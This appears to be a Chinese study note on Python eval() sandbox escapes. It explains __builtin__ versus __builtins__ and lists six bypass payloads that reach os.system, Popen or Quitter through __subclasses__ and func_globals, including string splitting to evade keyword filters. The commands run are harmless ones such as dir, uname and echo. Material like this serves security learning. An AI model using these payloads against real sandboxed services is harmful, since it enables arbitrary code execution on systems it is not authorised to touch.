参考：
	- https://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html
	- https://blog.51cto.com/xpleaf/1764849

## builtin与builtins的区别与关系
python3
	python3中只有__builtins__了

python2
	1. 在Python中并没有__builtins__这个模块，只有__builtin__模块，而__builtins__模块只是在启动Python解释器时，解释器为我们自动创建的一个到__builtin__模块的引用
	2. 在主模块__main__中,两者完全一样
	3. 非主模块中，模块__builtins__其实是对__builtin__的__dict__模块的引用

## 利用
原型：eval(expression[, globals[, locals]])
globals为字典形式,locals为任何映射对象,分别是全局和局部命名空间，如果传入globals字典缺失__builtins__的时候，当前的全局命名空间将作为globals参数输入并且在表达式之前被解析，locals默认和globals相同，如果两个都省略掉话，表达式将在eval()调用的环境里面执行

1. 最简单的
```python
eval(__import__('os').system('dir'))
```

2. 置空无效
本地测试没有成功....
```python
env = {}
env["locals"]   = None
env["globals"]  = None
env["__name__"] = None
env["__file__"] = None
env["__builtins__"] = None
 
eval(users_str, env)
```

3. 调用egg
（python2）
```python
# http://pypi.python.org/packages/2.5/C/ConfigObj/configobj-4.4.0-py2.5.egg
[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == "zipimporter"][0]("configobj-4.4.0-py2.5.egg").load_module("configobj").os.system("uname")
```

4. 使程序退出
（python2）
```python
eval("[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__=='Quitter'][0](0)()", {'__builtins__':None})
```

5. 事先导入过一些模块
（python2，python3）
```python
import subprocess
eval("[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'Popen'][0](['ping','-c','1','127.0.0.1'])", {'__builtins__':None ,'__builtin__':None})
```

6. 寻找含有os模块的类
（python2）
```python
[x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('echo Hello SandBox')
```